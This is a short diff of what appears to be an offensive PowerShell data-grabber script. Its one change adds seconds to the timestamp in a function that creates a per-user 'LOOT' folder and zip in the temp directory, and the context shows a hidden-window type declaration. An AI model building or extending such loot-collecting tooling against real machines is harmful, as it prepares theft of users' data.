@@ -30,7 +30,7 @@ Add-Type -Name Win -Member $i -Namespace native
 
 # Function to create loot folder, file, and zip
 function Initialize-LootFolder {
-    $FolderName = "$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm)"
+    $FolderName = "$env:USERNAME-LOOT-$(Get-Date -f yyyy-MM-dd_hh-mm-ss)"
     $ZIP = "$FolderName.zip"
     
     New-Item -Path $env:TEMP/$FolderName -ItemType Directory
